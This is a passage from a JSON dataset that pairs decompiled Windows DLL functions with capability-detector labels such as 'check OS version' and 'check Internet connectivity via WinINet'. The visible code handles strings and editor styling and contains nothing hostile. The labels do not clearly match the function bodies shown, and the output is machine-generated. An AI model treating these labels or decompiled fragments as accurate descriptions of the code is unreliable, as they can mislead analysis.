uStack112));\n                    }\n                    arg1_00 = puVar7 + uStack96;\n                    uStack96 = uVar13;\n                    fcn.1800ade80(arg1_00, puVar11, arg2_00 * 2);\n                    puVar7[uVar13] = 0;\n                }\n                arg1 = iStack320;\n            } while (uStack96 < iVar4);\n        }\n        uStack384 = CONCAT44(*0x180101904, *0x180101900);\n        uStack376 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack400 = 0;\n        uStack399 = 0;\n        uVar13 = iVar4;\n        if (uStack96 < iVar4) {\n            uVar13 = uStack96;\n        }\n        puVar7 = &uStack112;\n        if (7 < uStack88) {\n            puVar7 = CONCAT44(uStack108, CONCAT22(uStack110, uStack112));\n        }\n        fcn.180010d70(&uStack400, puVar7, uVar13);\n        uStack368 = CONCAT44(uStack368._4_4_, 8);\n        if (7 < uStack88) {\n            iVar3 = CONCAT44(uStack108, CONCAT22(uStack110, uStack112));\n            iVar12 = iVar3;\n            if ((uStack88 * 2 + 2 < 0x1000) || (iVar12 = *(iVar3 + -8),  (iVar3 - iVar12) - 8U < 0x20)) {\n                fcn.18008fb24(iVar12);\n                goto code_r0x000180057c58;\n            }\n            goto code_r0x000180057f83;\n        }\ncode_r0x000180057c58:\n        uStack112 = CONCAT11(uStack399, uStack400);\n        uStack110 = uStack398;\n        uStack108 = uStack396;\n        uStack104 = uStack392;\n        uStack100 = uStack388;\n        uStack96 = uStack384;\n        uStack88 = uStack376;\n        bVar14 = *(arg1 + 0xc6) == '\\0';\n        if (bVar14) {\n            puVar8 = fcn.1800125d0(&uStack400, &uStack112, &uStack144);\n        }\n        else {\n            puVar8 = fcn.1800125d0(&uStack352, &uStack144, &uStack112);\n        }\n        if (&uStack144 != puVar8) {\n            if (uStack120 < 8) {\ncode_r0x000180057cf2:\n                uStack140 = puVar8[1];\n                uStack136 = puVar8[2];\n                uStack132 = puVar8[3];\n                uStack144._0_2_ = *puVar8;\n                uStack144._2_2_ = *puVar8 >> 0x10;\n                uStack128 = *(puVar8 + 4);\n                uStack120 = *(puVar8 + 6);\n                *(puVar8 + 4) = 0;\n                *(puVar8 + 6) = 7;\n                *puVar8 = 0;\n                goto code_r0x000180057d20;\n            }\n            iVar3 = CONCAT44(uStack140, CONCAT22(uStack144._2_2_, uStack144));\n            iVar12 = iVar3;\n            if ((uStack120 * 2 + 2 < 0x1000) || (iVar12 = *(iVar3 + -8),  (iVar3 - iVar12) - 8U < 0x20)) {\n                fcn.18008fb24(iVar12);\n                goto code_r0x000180057cf2;\n            }\n            goto code_r0x000180057f89;\n        }\ncode_r0x000180057d20:\n        if (bVar14) {\n            if (7 < uStack376) {\n                iVar3 = CONCAT44(uStack396, CONCAT22(uStack398, CONCAT11(uStack399, uStack400)));\n                iVar12 = iVar3;\n                if ((0xfff < uStack376 * 2 + 2) && (iVar12 = *(iVar3 + -8),  0x1f < (iVar3 - iVar12) - 8U))\n                goto code_r0x000180057f89;\n                fcn.18008fb24(iVar12);\n            }\n            uStack384 = CONCAT44(*0x180101904, *0x180101900);\n            uStack376 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack400 = 0;\n            uStack399 = 0;\n        }\n        if ((!bVar14) && (7 < uStack328)) {\n            iVar3 = CONCAT71(Stack351, uStack352);\n            iVar12 = iVar3;\n            if ((uStack328 * 2 + 2 < 0x1000) || (iVar12 = *(iVar3 + -8),  (iVar3 - iVar12) - 8U < 0x20)) {\n                fcn.18008fb24(iVar12);\n                goto code_r0x000180057dc6;\n            }\n            goto code_r0x000180057f8f;\n        }\ncode_r0x000180057dc6:\n        if (uStack88 < 8) {\ncode_r0x000180057e06:\n            uStack96 = 0;\n            uStack88 = 7;\n            uStack112 = 0;\n            if (7 < uVar9) {\n                puVar11 = puVar10;\n                if ((0xfff < uVar9 * 2 + 2) && (puVar11 = *(puVar10 + -8),  0x1f < puVar10 + (-8 - puVar11)))\n                goto code_r0x000180057f9b;\n                fcn.18008fb24(puVar11);\n            }\n            goto code_r0x000180057e51;\n        }\n        iVar3 = CONCAT44(uStack108, CONCAT22(uStack110, uStack112));\n        iVar12 = iVar3;\n        if ((uStack88 * 2 + 2 < 0x1000) || (iVar12 = *(iVar3 + -8),  (iVar3 - iVar12) - 8U < 0x20)) {\n            fcn.18008fb24(iVar12);\n            goto code_r0x000180057e06;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180057f9b:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 4130
    },
    "18005815": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180058150(int64_t arg1, int64_t **arg2)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    ulong uVar6;\n    ulong arg1_00;\n    uchar *puVar7;\n    int64_t *piVar8;\n    int64_t **arg2_00;\n    int64_t iVar9;\n    uint64_t arg4;\n    int64_t arg3;\n    uint32_t uVar10;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    ulong var_fh;\n    ulong var_1fh;\n    uchar auStack312 [32];\n    uchar *puStack280;\n    char cStack264;\n    int32_t iStack260;\n    uchar uStack256;\n    uchar uStack255;\n    unkbyte6 Stack254;\n    ulong uStack240;\n    uint64_t uStack232;\n    uchar auStack224 [4];\n    int32_t iStack220;\n    int32_t iStack216;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar uStack192;\n    uchar uStack191;\n    unkbyte6 Stack190;\n    ulong uStack176;\n    uint64_t uStack168;\n    ulong uStack160;\n    uchar *puStack152;\n    uchar *puStack144;\n    uchar auStack136 [3];\n    ulong var_7dh;\n    int64_t **var_71h;\n    ulong var_69h;\n    ulong var_61h;\n    uint uStack96;\n    uchar auStack92 [3];\n    ulong var_51h;\n    ulong var_49h;\n    ulong var_41h;\n    uint64_t var_39h;\n    ulong var_31h;\n    ulong var_29h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_1h;\n    \n    _auStack136 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack312;\n    stack0xffffffffffffff80 = -1;\n    unique0x100007e4 = arg2;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, &var_7dh + 5);\n    if (stack0xffffffffffffff80 < 0) {\ncode_r0x000180058743:\n        if (arg2[3] < 0x8) {\ncode_r0x000180058783:\n            *arg2 = 0;\n            arg2[3] = 0x7;\n            arg2[2] = NULL;\n            fcn.18008fb00(stack0xffffffffffffffc0 ^ auStack312);\n            return;\n        }\n        piVar2 = *arg2;\n        piVar8 = piVar2;\n        if ((arg2[3] * 2 + 2U < 0x1000) || (piVar8 = piVar2[-1],  piVar2 + (-8 - piVar8) < 0x20)) {\n            fcn.18008fb24(piVar8);\n            goto code_r0x000180058783;\n        }\ncode_r0x0001800587bf:\n        fcn.1800b3528();\ncode_r0x0001800587c5:\n        fcn.1800b3528();\ncode_r0x0001800587cb:\n        fcn.1800b3528();\n    }\n    else {\n        iVar9 = *0x18012a398;\n        if (stack0xffffffffffffff80 != 0) {\n            iVar9 = *0x18012a3a0;\n        }\n        if (iVar9 == 0) goto code_r0x000180058743;\n        pcVar5 = (**0x1800de7f0)(iVar9, 0x888, 0, 0);\n        uVar6 = (**0x1800de7f0)(iVar9, 0x889, 0, 0);\n        arg4 = 0;\n        uStack240 = 0;\n        uStack232 = 0xf;\n        uStack256 = 0;\n        puVar7 = &uStack256;\n        fcn.180011120(puVar7, 0x1800fcba0, 0x11);\n        cStack264 = fcn.180007d40(puVar7, &uStack256);\n        uStack160 = (**0x1800de7f0)(*0x18012a390, 0x843, 0, 0);\n        puStack152 = &uStack256;\n        uStack240 = 0;\n        uStack232 = 7;\n        uStack256 = 0;\n        uStack255 = 0;\n        fcn.180010d70(&uStack256, 0x1800f8294, 0);\n        uStack208 = *0x180101910;\n        uStack204 = *0x180101914;\n        uStack200 = *0x180101918;\n        uStack196 = *0x18010191c;\n        _auStack224 = ZEXT1516(stack0xffffffffffffff21) << 8;\n        puVar7 = auStack224;\n        fcn.180011120(puVar7, \"Count\", 5);\n        puStack280 = &uStack256;\n        arg1_00 = fcn.180005860(puVar7, &uStack192, arg2, auStack224);\n        iVar4 = fcn.180067a70(arg1_00, 10);\n        if (7 < uStack168) {\n            iVar3 = CONCAT62(Stack190, CONCAT11(uStack191, uStack192));\n            iVar9 = iVar3;\n            if ((uStack168 * 2 + 2 < 0x1000) || (iVar9 = *(iVar3 + -8),  (iVar3 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x00018005831b;\n            }\n            goto code_r0x0001800587c5;\n        }\ncode_r0x00018005831b:\n        uStack176 = CONCAT44(*0x180101904, *0x180101900);\n        uStack168 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack192 = 0;\n        uStack191 = 0;\n        if (0xf < CONCAT44(uStack196, uStack200)) {\n            iVar9 = _auStack224;\n            if ((CONCAT44(uStack196, uStack200) + 1 < 0x1000) ||\n               (iVar9 = *(_auStack224 + -8),  (_auStack224 - iVar9) - 8U < 0x20)) {\n                fcn.18008fb24(iVar9);\n                goto code_r0x000180058368;\n            }\n            goto code_r0x0001800587cb;\n        }\ncode_r0x000180058368:\n        iVar1 = *(arg1 + 0x138);\n        if (199 < iVar1 + iVar4) {\n            iVar4 = 199 - iVar1;\n        }\n        if (iVar4 < 1) {\n            if (arg2[3] < 0x8) goto code_r0x000180058783;\n            piVar2 = *arg2;\n            piVar8 = piVar2;\n            if ((arg2[3] * 2 + 2U < 0x1000) || (piVar8 = piVar2[-1],  piVar2 + (-8 - piVar8) < 0x20)) {\n                fcn.18008fb24(piVar8);\n                goto code_r0x000180058783;\n            }\n            goto code_r0x0001800587bf;\n        }\n        puStack152 = puStack152 & 0xffffffff00000000 | iVar1 + 0x28;\n        uStack96 = *0x180101900;\n        _auStack92 = *0x180101904;\n        var_51h._1_4_ = *0x180101908;\n        stack0xffffffffffffffac = *0x18010190c;\n        var_69h._1_2_ = 0;\n        stack0xffffffffffffffb0 = 0;\n        if (&var_69h + 1 != arg2) {\n            arg2_00 = arg2;\n            if (0x7 < arg2[3]) {\n                arg2_00 = *arg2;\n            }\n            fcn.180010d70(&var_69h + 1, arg2_00, arg2[2]);\n        }\n        iStack260 = iVar1 + 0x29;\n        stack0xffffffffffffffb0 = CONCAT44(iStack260, iVar4);\n        iVar9 = *(arg1 + 0x128);\n        if (iVar9 == *(arg1 + 0x130)) {\n            fcn.180063390(arg1 + 0x120, iVar9, &var_69h + 1);\n            _auStack224 = extraout_XMM0_00;\n        }\n        else {\n            fcn.18000da90(iVar9, &var_69h + 1);\n            *(iVar9 + 0x20) = var_49h._1_4_;\n            *(iVar9 + 0x24) = stack0xffffffffffffffb4;\n            *(arg1 + 0x128) = *(arg1 + 0x128) + 0x28;\n            _auStack224 = extraout_XMM0;\n        }\n        _auStack224 = _auStack224 & 0x0;\n        puStack144 = &uStack256;\n        uStack240 = 0;\n        uStack232 = 7;\n        uStack256 = 0;\n        uStack255 = 0;\n        fcn.180010d70(&uStack256, 0x1800f82b4, 0);\n        uStack176 = CONCAT44(*0x180101914, *0x180101910);\n        uStack168 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack192 = 0;\n        puVar7 = &uStack192;\n        fcn.180011120(puVar7, 0x1800f830c, 3);\n        puStack280 = &uStack256;\n        fcn.1800059e0(puVar7, arg2, &uStack192, auStack224);\n        if (uStack168 < 0x10) {\ncode_r0x000180058519:\n            iVar9 = puStack152;\n            if (cStack264 != '\\0') {\n                auStack224 = uStack160;\n            }\n            (*pcVar5)(uVar6, 0x804, iVar9, auStack224);\n            (*pcVar5)(uVar6, 0x803, iVar9, iStack220);\n            (*pcVar5)(uVar6, 0x805, iVar9, iStack216);\n            (*pcVar5)(uVar6, 0x806, iVar9);\n            do {\n                fcn.180020af0(&var_41h + 1, 8, \"BFBI_%02i\", arg4);\n                puStack144 = &uStack192;\n                uStack176 = 0;\n                uStack168 = 7;\n                uStack192 = 0;\n                uStack191 = 0;\n                fcn.180010d70(&uStack192, 0x1800f83dc, 0);\n                uStack240 = 0;\n                uStack232 = 0xf;\n                uStack256 = 0;\n                iVar9 = -1;\n                do {\n                    arg3 = iVar9 + 1;\n                    iVar3 = iVar9 + 2;\n                    iVar9 = arg3;\n                } while (*(&var_41h + iVar3) != '\\0');\n                puVar7 = &uStack256;\n                fcn.180011120(puVar7, &var_41h + 1, arg3);\n                puStack280 = &uStack192;\n                fcn.1800059e0(puVar7, arg2, &uStack256, auStack224);\n                if (0xf < uStack232) {\n                    iVar3 = CONCAT62(Stack254, CONCAT11(uStack255, uStack256));\n                    iVar9 = iVar3;\n                    if (0xfff < uStack232 + 1) {\n                        iVar9 = *(iVar3 + -8);\n                        if (0x1f < (iVar3 - iVar9) - 8U) {\n                            fcn.1800b3528(iVar9, uStack232 + 0x28);\n                            goto code_r0x0001800587bf;\n                        }\n                    }\n                    fcn.18008fb24(iVar9);\n                }\n                iVar9 = iStack260;\n                if (cStack264 != '\\0') {\n                    auStack224 = uStack160;\n                }\n                (*pcVar5)(uVar6, 0x804, iVar9, auStack224);\n                (*pcVar5)(uVar6, 0x803, iVar9, iStack220);\n                (*pcVar5)(uVar6, 0x805, iVar9, iStack216);\n                (*pcVar5)(uVar6, 0x806, iVar9);\n                iStack260 = iStack260 + 1;\n                uVar10 = arg4 + 1;\n                arg4 = uVar10;\n            } while (uVar10 < iVar4);\n            if (7 < CONCAT44(stack0xffffffffffffffac, var_51h._1_4_)) {\n                iVar3 = CONCAT62(stack0xffffffffffffff92, var_69h._1_2_);\n                iVar9 = iVar3;\n                if ((0xfff < CONCAT44(stack0xffffffffffffffac, var_51h._1_4_) * 2 + 2) &&\n                   (iVar9 = *(iVar3 + -8),  0x1f < (iVar3 - iVar9) - 8U)) goto code_r0x0001800587d7;\n                fcn.18008fb24(iVar9);\n            }\n            if (arg2[3] < 0x8) goto code_r0x000180058783;\n            piVar2 = *arg2;\n            piVar8 = piVar2;\n            if ((arg2[3] * 2 + 2U < 0x1000) || (piVar8 = piVar2[-1],  piVar2 + (-8 - piVar8) < 0x20)) {\n                fcn.18008fb24(piVar8);\n                goto code_r0x000180058783;\n            }\n            goto code_r0x0001800587bf;\n        }\n        iVar3 = CONCAT62(Stack190, CONCAT11(uStack191, uStack192));\n        iVar9 = iVar3;\n        if ((uStack168 + 1 < 0x1000) || (iVar9 = *(iVar3 + -8),  (iVar3 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180058519;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x0001800587d7:\n    fcn.1800b3528();\n    pcVar5 = swi(3);\n    (*pcVar5)();\n    return;\n}\n",
        "token_count": 3585
    },
    "1800587e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800587e0(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t ****ppppiVar7;\n    uint16_t **ppuVar8;\n    int64_t iVar9;\n    ulong ****ppppuVar10;\n    int64_t iVar11;\n    uint64_t *puVar12;\n    uint64_t *puVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    ulong ****ppppuVar16;\n    int64_t ***pppiVar17;\n    int64_t ****ppppiVar18;\n    int64_t ***pppiVar19;\n    int64_t iVar20;\n    uint16_t **ppuVar21;\n    int64_t ***pppiVar22;\n    int64_t ***pppiVar23;\n    bool bVar24;\n    bool bVar25;\n    uchar extraout_XMM0 [16];\n    ulong var_8h_2;\n    ulong var_10h_2;\n    ulong var_18h;\n    ulong var_28h_2;\n    ulong var_30h_2;\n    ulong var_38h;\n    ulong var_48h;\n    ulong var_bp_50h;\n    ulong var_58h;\n    uchar auStack392 [32];\n    ulong ****ppppuStack360;\n    ulong *puStack352;\n    ulong ****ppppuStack344;\n    uint uStack336;\n    uint uStack332;\n    int64_t ***pppiStack328;\n    uint64_t uStack320;\n    ulong *puStack312;\n    uchar uStack304;\n    unkbyte7 Stack303;\n    ulong uStack288;\n    uint64_t uStack280;\n    int64_t iStack272;\n    int64_t iStack264;\n    uchar *puStack256;\n    ulong auStack248 [2];\n    ulong uStack232;\n    ulong uStack224;\n    ushort uStack216;\n    unkbyte6 Stack214;\n    ulong uStack200;\n    uint64_t uStack192;\n    ulong uStack184;\n    int32_t aiStack176 [2];\n    int64_t ****ppppiStack168;\n    uint uStack160;\n    uint uStack156;\n    int64_t ***pppiStack152;\n    int64_t ***pppiStack144;\n    int64_t var_80h;\n    ulong var_bp_78h;\n    int64_t var_bp_70h;\n    ushort uStack112;\n    unkbyte6 Stack110;\n    ulong var_60h;\n    ulong var_58h_2;\n    uint uStack88;\n    uint uStack84;\n    uchar uStack80;\n    unkbyte7 Stack79;\n    ulong var_bp_40h;\n    ulong var_38h_2;\n    ulong var_30h;\n    uint64_t var_28h;\n    ulong var_20h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack184 = 0xfffffffffffffffe;\n    var_28h = *0x180123080 ^ auStack392;\n    aiStack176[0] = 0;\n    *(arg1 + 0x138) = 0;\n    fcn.180063f80(*(arg1 + 0x120), *(arg1 + 0x128));\n    *(arg1 + 0x128) = *(arg1 + 0x120);\n    aiStack176[0] = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack176);\n    if (-1 < aiStack176[0]) {\n        iVar9 = *0x18012a398;\n        if (aiStack176[0] != 0) {\n            iVar9 = *0x18012a3a0;\n        }\n        if (iVar9 != 0) {\n            (**0x1800de7f0)(iVar9, 0x808, 0x26, \"Consolas\");\n            (**0x1800de7f0)(iVar9, 0x80f, 0x26, 0x226);\n            (**0x1800de7f0)(iVar9, 0x803, 0x26, 0x3f5faf);\n            (**0x1800de7f0)(iVar9, 0x804, 0x26, 0xffffff);\n            (**0x1800de7f0)(iVar9, 0x8a4, 3, 0);\n        }\n    }\n    var_38h_2._0_4_ = *0x180101910;\n    var_38h_2._4_4_ = *0x180101914;\n    var_30h._0_4_ = *0x180101918;\n    var_30h._4_4_ = *0x18010191c;\n    uStack80 = 0;\n    iVar9 = arg1;\n    cVar5 = fcn.1800602c0(arg1, &uStack80);\n    if (cVar5 == '\\0') {\ncode_r0x000180059050:\n        uVar14 = CONCAT44(var_30h._4_4_, var_30h);\n        if (uVar14 < 0x10) goto code_r0x000180059087;\n        iVar11 = CONCAT71(Stack79, uStack80);\n        iVar9 = iVar11;\n        if (0xfff < uVar14 + 1) {\n            iVar9 = *(iVar11 + -8);\n            if (0x1f < (iVar11 - iVar9) - 8U) {\n                fcn.1800b3528(iVar9, uVar14 + 0x28);\n                goto code_r0x0001800590bc;\n            }\n        }\n        fcn.18008fb24(iVar9);\ncode_r0x000180059087:\n        fcn.18008fb00(var_28h ^ auStack392);\n        return;\n    }\n    fcn.180004530(iVar9, &uStack80);\n    var_58h_2._0_4_ = *0x180101900;\n    var_58h_2._4_4_ = *0x180101904;\n    uStack88 = *0x180101908;\n    uStack84 = *0x18010190c;\n    uStack112 = 0;\n    cVar5 = fcn.180060420(arg1, &uStack112);\n    puVar12 = CONCAT62(Stack110, uStack112);\n    if (cVar5 == '\\0') {\ncode_r0x000180059013:\n        if (7 < CONCAT44(uStack84, uStack88)) {\n            puVar13 = puVar12;\n            if ((0xfff < CONCAT44(uStack84, uStack88) * 2 + 2) &&\n               (puVar13 = puVar12[-1],  0x1f < puVar12 + (-8 - puVar13))) goto code_r0x0001800590e6;\n            fcn.18008fb24(puVar13);\n        }\n        goto code_r0x000180059050;\n    }\n    pppiStack152 = NULL;\n    pppiStack144 = NULL;\n    puVar13 = &uStack112;\n    if (7 < CONCAT44(uStack84, uStack88)) {\n        puVar13 = puVar12;\n    }\n    uVar14 = CONCAT44(var_58h_2._4_4_, var_58h_2);\n    if (uVar14 < 8) {\n        ppppiStack168 = *puVar13;\n        uStack160 = *(puVar13 + 1);\n        uStack156 = *(puVar13 + 0xc);\n        uVar15 = 7;\n    }\n    else {\n        uVar15 = uVar14 | 7;\n        if (0x7ffffffffffffffe < uVar15) {\n            uVar15 = 0x7ffffffffffffffe;\n        }\n        ppppiStack168 = fcn.180011cf0(&ppppiStack168, uVar15 + 1);\n        fcn.1800ade80(ppppiStack168, puVar13, uVar14 * 2 + 2);\n    }\n    pppiStack152 = uVar14;\n    pppiStack144 = uVar15;\n    iVar6 = fcn.180058150(arg1, &ppppiStack168);\n    *(arg1 + 0x138) = *(arg1 + 0x138) + iVar6;\n    _var_80h = ZEXT816(0);\n    var_bp_70h = 0;\n    puStack312 = &uStack304;\n    uStack288 = 0;\n    uStack280 = 0xf;\n    uStack304 = 0;\n    fcn.180011120(&uStack304, 0x1800f48c6, 0);\n    pppiStack328 = CONCAT44(*0x180101914, *0x180101910);\n    uStack320 = CONCAT44(*0x18010191c, *0x180101918);\n    ppppuStack344 = ppppuStack344 & 0xffffffffffffff00;\n    fcn.180011120(&ppppuStack344, 0x1800f48c7, 0);\n    pppiStack152 = CONCAT44(*0x180101914, *0x180101910);\n    pppiStack144 = CONCAT44(*0x18010191c, *0x180101918);\n    ppppiStack168 = ppppiStack168 & 0xffffffffffffff00;\n    ppppiVar7 = &ppppiStack168;\n    fcn.180011120(ppppiVar7, 0x1800fcbc8, 0xb);\n    puStack352 = &uStack304;\n    ppppuStack360 = &ppppuStack344;\n    iVar6 = fcn.180009a40(ppppiVar7, &var_80h, &uStack80, &ppppiStack168);\n    if (pppiStack144 < 0x10) {\ncode_r0x000180058ad9:\n        pppiStack152 = CONCAT44(*0x180101914, *0x180101910);\n        pppiStack144 = CONCAT44(*0x18010191c, *0x180101918);\n        ppppiStack168 = ppppiStack168 & 0xffffffffffffff00;\n        if (0xf < uStack320) {\n            ppppuVar10 = ppppuStack344;\n            if ((uStack320 + 1 < 0x1000) || (ppppuVar10 = ppppuStack344[-1],  ppppuStack344 + (-8 - ppppuVar10) < 0x20))\n            {\n                fcn.18008fb24(ppppuVar10);\n                goto code_r0x000180058b27;\n            }\n            goto code_r0x0001800590c2;\n        }\ncode_r0x000180058b27:\n        puStack312 = iVar6;\n        if (0 < iVar6) {\n            iStack272 = 0;\n            iStack264 = 0;\n            do {\n                iVar9 = iStack264;\n                pppiVar22 = NULL;\n                pppiStack152 = NULL;\n                pppiStack144 = 0x7;\n                ppppiStack168 = ppppiStack168 & 0xffffffffffff0000;\n                puStack256 = auStack248;\n                uStack232 = 0;\n                uStack224 = 0xf;\n                auStack248[0]._0_1_ = 0;\n                fcn.180011120(auStack248, 0x1800f48e7, 0);\n                uStack288 = 0;\n                uStack280 = 0xf;\n                uStack304 = 0;\n                fcn.180011120(&uStack304, 0x1800f48e6, 0);\n                pppiStack328 = NULL;\n                uStack320 = 0xf;\n                ppppuStack344 = ppppuStack344 & 0xffffffffffffff00;\n                aiStack176[0] = 1;\n                uVar14 = *(iVar9 + var_80h + 0x10) + 6;\n                if (0xf < uVar14) {\n                    fcn.1800137f0(&ppppuStack344, uVar14);\n                }\n                pppiStack328 = NULL;\n                fcn.18000dc30(&ppppuStack344, iVar9 + var_80h);\n                if (uStack320 - pppiStack328 < 6) {\n                    ppppuStack360 = 0x6;\n                    ppppuVar10 = &ppppuStack344;\n                    fcn.180014270(ppppuVar10, 6, 0, 0x1800f8424);\n                }\n                else {\n                    ppppuVar16 = &ppppuStack344;\n                    if (0xf < uStack320) {\n                        ppppuVar16 = ppppuStack344;\n                    }\n                    ppppuVar16 = ppppuVar16 + pppiStack328;\n                    ppppuVar10 = ppppuVar16;\n                    pppiStack328 = pppiStack328 + 6;\n                    fcn.1800ade80(ppppuVar16, 0x1800f8424, 6);\n                    *(ppppuVar16 + 6) = 0;\n                }\n                puStack352 = auStack248;\n                ppppuStack360 = &uStack304;\n                ppppiVar7 = fcn.180004f50(ppppuVar10, &uStack216, &uStack80, &ppppuStack344);\n                pppiVar17 = pppiVar22;\n                pppiVar23 = 0x7;\n                if (&ppppiStack168 != ppppiVar7) {\n                    ppppiStack168 = *ppppiVar7;\n                    uStack160 = *(ppppiVar7 + 1);\n                    uStack156 = *(ppppiVar7 + 0xc);\n                    pppiStack152 = ppppiVar7[2];\n                    pppiStack144 = ppppiVar7[3];\n                    ppppiVar7[2] = NULL;\n                    ppppiVar7[3] = 0x7;\n                    *ppppiVar7 = 0;\n                    pppiVar17 = pppiStack152;\n                    pppiVar23 = pppiStack144;\n                }\n                if (7 < uStack192) {\n                    iVar11 = CONCAT62(Stack214, uStack216);\n                    iVar9 = iVar11;\n                    if ((0xfff < uStack192 * 2 + 2) && (iVar9 = *(iVar11 + -8),  0x1f < (iVar11 - iVar9) - 8U))\n                    goto code_r0x0001800590ce;\n                    fcn.18008fb24(iVar9);\n                }\n                uStack200 = 0;\n                uStack192 = 7;\n                uStack216 = 0;\n                if (0xf < uStack320) {\n                    ppppuVar10 = ppppuStack344;\n                    if ((0xfff < uStack320 + 1) &&\n                       (ppppuVar10 = ppppuStack344[-1],  0x1f < ppppuStack344 + (-8 - ppppuVar10)))\n                    goto code_r0x0001800590d4;\n                    fcn.18008fb24(ppppuVar10);\n                }\n                pppiStack328 = NULL;\n                uStack320 = 0xf;\n                ppppuStack344 = ppppuStack344 & 0xffffffffffffff00;\n                if (0xf < uStack280) {\n                    iVar11 = CONCAT71(Stack303, uStack304);\n                    iVar9 = iVar11;\n                    if ((0xfff < uStack280 + 1) && (iVar9 = *(iVar11 + -8),  0x1f < (iVar11 - iVar9) - 8U))\n                    goto code_r0x0001800590da;\n                    fcn.18008fb24(iVar9);\n                }\n                ppppiVar7 = ppppiStack168;\n                if (pppiVar17 == NULL) {\n                    if (0x7 < pppiVar23) {\n                        if ((0xfff < pppiVar23 * 2 + 2U) &&\n                           (ppppiVar7 = ppppiStack168[-1],  0x1f < ppppiStack168 + (-8 - ppppiVar7)))\n                        goto code_r0x0001800590e0;\n                        fcn.18008fb24(ppppiVar7);\n                    }\n                }\n                else {\n                    bVar4 = false;\n                    ppuVar21 = *(arg1 + 0x120);\n                    iVar11 = *(arg1 + 0x128) - ppuVar21;\n                    iVar9 = iVar11 >> 0x3f;\n                    iVar11 = iVar11 / 0x28 + iVar9;\n                    if (iVar11 != iVar9) {\n                        do {\n                            ppuVar8 = ppuVar21;\n                            if (0x7 < ppuVar21[3]) {\n                                ppuVar8 = *ppuVar21;\n                            }\n                            ppppiVar18 = &ppppiStack168;\n                            if (0x7 < pppiVar23) {\n                                ppppiVar18 = ppppiStack168;\n                            }\n                            if (pppiVar17 == ppuVar21[2]) {\n                                uVar1 = *ppppiVar18;\n                                uVar2 = *ppuVar8;\n                                if (uVar2 <= uVar1) {\n                                    iVar20 = ppppiVar18 - ppuVar8;\n                                    bVar24 = uVar1 < uVar2;\n                                    bVar25 = uVar1 == uVar2;\n                                    pppiVar19 = pppiVar17;\n                                    do {\n                                        if (!bVar24 && !bVar25) break;\n                                        if (pppiVar19 == 0x1) {\n                                            bVar4 = true;\n                                            goto code_r0x000180058e91;\n                                        }\n                                        pppiVar19 = pppiVar19 + -1;\n                                        ppuVar8 = ppuVar8 + 2;\n                                        uVar1 = *(ppuVar8 + iVar20);\n                                        bVar24 = uVar1 < *ppuVar8;\n                                        bVar25 = uVar1 == *ppuVar8;\n                                    } while (!bVar24);\n                                }\n                            }\n                            pppiVar22 = pppiVar22 + 1;\n                            ppuVar21 = ppuVar21 + 5;\n                        } while (pppiVar22 < iVar11 - iVar9);\n                    }\ncode_r0x000180058e91:\n                    if (!bVar4) {\n                        pppiStack328 = NULL;\n                        uStack320 = 0;\n                        ppppiVar18 = &ppppiStack168;\n                        if (0x7 < pppiVar23) {\n                            ppppiVar18 = ppppiStack168;\n                        }\n                        if (pppiVar17 < 0x8) {\n                            ppppuStack344 = *ppppiVar18;\n                            uStack336 = *(ppppiVar18 + 1);\n                            uStack332 = *(ppppiVar18 + 0xc);\n                            uStack320 = 7;\n                        }\n                        else {\n                            uVar14 = pppiVar17 | 7;\n                            if (0x7ffffffffffffffe < uVar14) {\n                                uVar14 = 0x7ffffffffffffffe;\n                            }\n                            ppppuStack344 = fcn.180011cf0(&ppppuStack344, uVar14 + 1);\n                            fcn.1800ade80(ppppuStack344, ppppiVar18, pppiVar17 * 2 + 2);\n                            uStack320 = uVar14;\n                        }\n                        pppiStack328 = pppiVar17;\n                        iVar6 = fcn.180058150(arg1, &ppppuStack344);\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + iVar6;\n                    }\n                    if (0x7 < pppiVar23) {\n                        ppppiVar18 = ppppiVar7;\n                        if ((0xfff < pppiVar23 